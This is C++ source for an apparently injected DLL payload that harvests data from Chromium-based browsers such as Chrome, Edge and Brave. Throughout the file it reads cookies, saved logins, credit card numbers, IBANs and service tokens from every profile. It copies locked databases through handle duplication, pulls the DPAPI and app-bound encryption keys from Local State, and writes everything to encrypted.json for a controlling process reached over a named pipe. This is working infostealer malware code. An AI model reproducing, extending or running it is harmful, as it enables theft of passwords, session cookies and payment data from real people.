#include "../core/common.hpp"
#include "../payload/pipe_client.hpp"
#include "../payload/handle_duplicator.hpp"
#include "../payload/extra_extractor.hpp"
#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <filesystem>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <memory>
#include "sqlite3.h"

#pragma comment(lib, "crypt32.lib")

using namespace Payload;

static HMODULE g_hModule = nullptr;

static void LogDebug(const char* msg) {
    wchar_t tempPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPath)) {
        std::wstring logFile = std::wstring(tempPath) + L"collector_payload_debug.log";
        HANDLE hFile = CreateFileW(logFile.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ, nullptr,
            OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, msg, (DWORD)strlen(msg), &written, nullptr);
            WriteFile(hFile, "\r\n", 2, &written, nullptr);
            CloseHandle(hFile);
        }
    }
    OutputDebugStringA(msg);
}

struct BrowserPaths {
    std::wstring name;
    std::wstring userDataPath;
};

static BrowserPaths GetBrowserPaths(const std::string& browserType) {
    std::wstring wType = Core::ToWide(browserType);
    wchar_t localAppData[MAX_PATH];
    if (SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, localAppData) != S_OK) {
        if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH) == 0)
            wcscpy_s(localAppData, L"C:\\Users\\Default\\AppData\\Local");
    }
    std::wstring base(localAppData);
    BrowserPaths bp;
    if (wType == L"chrome") { bp.name = L"Chrome";               bp.userDataPath = base + L"\\Google\\Chrome\\User Data"; }
    else if (wType == L"edge") { bp.name = L"Edge";                 bp.userDataPath = base + L"\\Microsoft\\Edge\\User Data"; }
    else if (wType == L"brave") { bp.name = L"Brave";                bp.userDataPath = base + L"\\BraveSoftware\\Brave-Browser\\User Data"; }
    else if (wType == L"avast") { bp.name = L"Avast Secure Browser"; bp.userDataPath = base + L"\\AVAST Software\\Browser\\User Data"; }
    else { bp.name = L"Chromium";             bp.userDataPath = base + L"\\Google\\Chrome\\User Data"; }
    return bp;
}

static std::string ToBase64(const std::vector<uint8_t>& data) {
    DWORD size = 0;
    CryptBinaryToStringA(data.data(), (DWORD)data.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &size);
    std::string result(size, '\0');
    CryptBinaryToStringA(data.data(), (DWORD)data.size(),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &size);
    if (!result.empty() && result.back() == '\0') result.pop_back();
    return result;
}

static std::string EscapeJson(const std::string& s) {
    std::ostringstream o;
    for (char c : s) {
        switch (c) {
        case '"':  o << "\\\""; break;
        case '\\': o << "\\\\"; break;
        case '\b': o << "\\b";  break;
        case '\f': o << "\\f";  break;
        case '\n': o << "\\n";  break;
        case '\r': o << "\\r";  break;
        case '\t': o << "\\t";  break;
        default:
            if (static_cast<unsigned char>(c) < 0x20)
                o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << static_cast<int>(c);
            else o << c;
        }
    }
    return o.str();
}

static sqlite3* OpenDatabaseDirect(const std::filesystem::path& dbPath) {
    sqlite3* db = nullptr;
    std::string uri = "file:" + dbPath.string() + "?nolock=1";
    if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) == SQLITE_OK)
        return db;
    if (db) sqlite3_close(db);
    return nullptr;
}

static std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState,
    const std::string& keyName, std::string* errorMsg = nullptr)
{
    std::ifstream f(localState, std::ios::binary);
    if (!f) { if (errorMsg) *errorMsg = "Cannot open Local State"; return {}; }
    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    std::string tag = "\"" + keyName + "\":\"";
    size_t pos = content.find(tag);
    if (pos == std::string::npos) { if (errorMsg) *errorMsg = "Key not found: " + keyName; return {}; }
    pos += tag.length();
    size_t end = content.find('"', pos);
    if (end == std::string::npos) { if (errorMsg) *errorMsg = "Malformed JSON"; return {}; }
    std::string b64 = content.substr(pos, end - pos);
    DWORD size = 0;
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
    if (size < 5) { if (errorMsg) *errorMsg = "Invalid key data"; return {}; }
    std::vector<uint8_t> data(size);
    CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);
    return std::vector<uint8_t>(data.begin() + 4, data.end());
}

static void ProcessTable(sqlite3* db, const std::string& query,
    const std::vector<std::string>& columnNames,
    const std::string& titlePrefix, const std::string& filePath,
    std::ostringstream& jsonOut, bool& first)
{
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) return;
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string title = titlePrefix;
        for (size_t i = 0; i < columnNames.size() - 1; ++i) {
            const unsigned char* text = sqlite3_column_text(stmt, (int)i);
            if (text) { if (!title.empty() && title.back() != ':') title += " "; title += (const char*)text; }
        }
        int blobIdx = (int)columnNames.size() - 1;
        const void* blob = sqlite3_column_blob(stmt, blobIdx);
        int blobLen = sqlite3_column_bytes(stmt, blobIdx);
        if (blob && blobLen > 0) {
            std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
            if (!first) jsonOut << ",\n";
            first = false;
            jsonOut << "  {\n"
                << "    \"title\": \"" << EscapeJson(title) << "\",\n"
                << "    \"path\": \"" << EscapeJson(filePath) << "\",\n"
                << "    \"encrypted_text\": \"" << ToBase64(encrypted) << "\",\n"
                << "    \"related_dpapi\": \"\",\n"
                << "    \"related_abe\": \"\"\n"
                << "  }";
        }
    }
    sqlite3_finalize(stmt);
}

static void CollectProfileData(const std::filesystem::path& profilePath,
    std::ostringstream& jsonOut, bool& first, PipeClient& pipe)
{
    pipe.Log("PROFILE:" + profilePath.filename().string());
    HandleDuplicator duplicator;
    std::vector<std::filesystem::path> tempFiles;

    auto openDb = [&](const std::filesystem::path& p) -> sqlite3* {
        sqlite3* db = OpenDatabaseDirect(p);
        if (db) return db;
        auto tmp = duplicator.CopyLockedFile(p, std::filesystem::temp_directory_path());
        if (tmp) { tempFiles.push_back(*tmp); return OpenDatabaseDirect(*tmp); }
        return nullptr;
        };

    auto cookiePath = profilePath / "Network" / "Cookies";
    if (std::filesystem::exists(cookiePath))
        if (auto* db = openDb(cookiePath)) {
            ProcessTable(db, "SELECT host_key, name, path, encrypted_value FROM cookies",
                { "host_key","name","path","encrypted_value" }, "cookie: ", cookiePath.string(), jsonOut, first);
            sqlite3_close(db);
        }

    auto loginPath = profilePath / "Login Data";
    if (std::filesystem::exists(loginPath))
        if (auto* db = openDb(loginPath)) {
            ProcessTable(db, "SELECT origin_url, username_value, password_value FROM logins",
                { "origin_url","username_value","password_value" }, "password: ", loginPath.string(), jsonOut, first);
            sqlite3_close(db);
        }

    auto webDataPath = profilePath / "Web Data";
    if (std::filesystem::exists(webDataPath))
        if (auto* db = openDb(webDataPath)) {
            ProcessTable(db, "SELECT name_on_card, card_number_encrypted FROM credit_cards",
                { "name_on_card","card_number_encrypted" }, "card: ", webDataPath.string(), jsonOut, first);
            ProcessTable(db, "SELECT nickname, value_encrypted FROM local_ibans",
                { "nickname","value_encrypted" }, "iban: ", webDataPath.string(), jsonOut, first);
            ProcessTable(db, "SELECT service, encrypted_token FROM token_service",
                { "service","encrypted_token" }, "token: ", webDataPath.string(), jsonOut, first);
            sqlite3_close(db);
        }

    for (const auto& tmp : tempFiles) try { std::filesystem::remove(tmp); }
    catch (...) {}
}

static DWORD DoCollectorWork(LPCWSTR pipeName, HMODULE hModule) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    LogDebug(SUCCEEDED(hr) ? "[+] CoInitialize OK" : "[-] CoInitialize FAILED");

    PipeClient pipe(pipeName);    
    if (!pipe.IsValid()) {
        LogDebug("[-] Pipe client invalid");
        CoUninitialize();
        FreeLibraryAndExitThread(hModule, 0);
        return 1;
    }

    LogDebug("[+] Pipe connected, reading config...");
    auto config = pipe.ReadConfig();
    LogDebug("[+] Config received");

    BrowserPaths bp = GetBrowserPaths(config.browserType);
    pipe.LogDebug("Collector running in " + Core::ToUtf8(bp.name));

    if (!Sys::InitApi(config.verbose))
        pipe.LogDebug("Warning: Syscall initialization failed.");

    std::filesystem::path userDataPath(bp.userDataPath);
    std::filesystem::path localStatePath = userDataPath / L"Local State";

    std::string error;
    auto encAbeKey = GetEncryptedKeyByName(localStatePath, "app_bound_encrypted_key", &error);
    std::string abeKeyBase64 = encAbeKey.empty() ? "" : ToBase64(encAbeKey);
    bool hasAbe = !encAbeKey.empty();

    auto encDpapiKey = GetEncryptedKeyByName(localStatePath, "encrypted_key");
    std::string dpapiKeyBase64 = encDpapiKey.empty() ? "" : ToBase64(encDpapiKey);

    std::ostringstream jsonOut;
    jsonOut << "[\n";
    bool first = true;

    std::error_code ec;
    for (const auto& entry : std::filesystem::directory_iterator(userDataPath, ec)) {
        if (ec) break;
        if (entry.is_directory() &&
            (std::filesystem::exists(entry.path() / L"Network" / L"Cookies") ||
                std::filesystem::exists(entry.path() / L"Login Data")))
            CollectProfileData(entry.path(), jsonOut, first, pipe);
    }

    ExtraExtractor extras(pipe);
    extras.CollectAll();                          

    

    jsonOut << "\n]";
    std::string jsonStr = jsonOut.str();

    auto stampKey = [&](const std::string& placeholder, const std::string& value) {
        if (value.empty()) return;
        size_t pos = 0;
        while ((pos = jsonStr.find(placeholder, pos)) != std::string::npos) {
            std::string replacement = "\"" + value + "\"";
            jsonStr.replace(pos, placeholder.length(), placeholder.substr(0, placeholder.length() - 1) + value + "\"");
            pos += placeholder.length() - 1 + value.length() + 1;
        }
        };
    if (hasAbe) {
        size_t pos = 0;
        const std::string search = "\"related_abe\": \"\"";
        const std::string replace = "\"related_abe\": \"" + abeKeyBase64 + "\"";
        while ((pos = jsonStr.find(search, pos)) != std::string::npos)
        {
            jsonStr.replace(pos, search.length(), replace); pos += replace.length();
        }
    }
    if (!dpapiKeyBase64.empty()) {
        size_t pos = 0;
        const std::string search = "\"related_dpapi\": \"\"";
        const std::string replace = "\"related_dpapi\": \"" + dpapiKeyBase64 + "\"";
        while ((pos = jsonStr.find(search, pos)) != std::string::npos)
        {
            jsonStr.replace(pos, search.length(), replace); pos += replace.length();
        }
    }
    (void)stampKey;

    std::filesystem::path outputDir(config.outputPath);
    std::filesystem::create_directories(outputDir);
    std::ofstream out(outputDir / "encrypted.json");
    if (out.is_open()) {
        out << jsonStr;
        out.close();
        pipe.Log("ENCRYPTED_JSON:" + (outputDir / "encrypted.json").string());
        pipe.Log("INFO: Collection finished successfully.");
        LogDebug("[+] encrypted.json written");
    }
    else {
        pipe.Log("ERROR: Failed to write encrypted.json");
        LogDebug("[-] Failed to write encrypted.json");
    }

    CoUninitialize();
    FreeLibraryAndExitThread(hModule, 0);
    return 0;
}

extern "C" __declspec(dllexport) void Bootstrap(LPVOID lpPipeName) {
    HMODULE hMod = nullptr;
    if (!GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCWSTR)Bootstrap, &hMod)) {
        hMod = GetModuleHandle(nullptr);
        LogDebug("[!] GetModuleHandleEx failed");
    }
    g_hModule = hMod;

    __try {
        DoCollectorWork(static_cast<LPCWSTR>(lpPipeName), hMod);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        char buf[128];
        sprintf_s(buf, "[!] Exception 0x%08X in Bootstrap", GetExceptionCode());
        LogDebug(buf);
        if (hMod) FreeLibraryAndExitThread(hMod, 1);
    }
}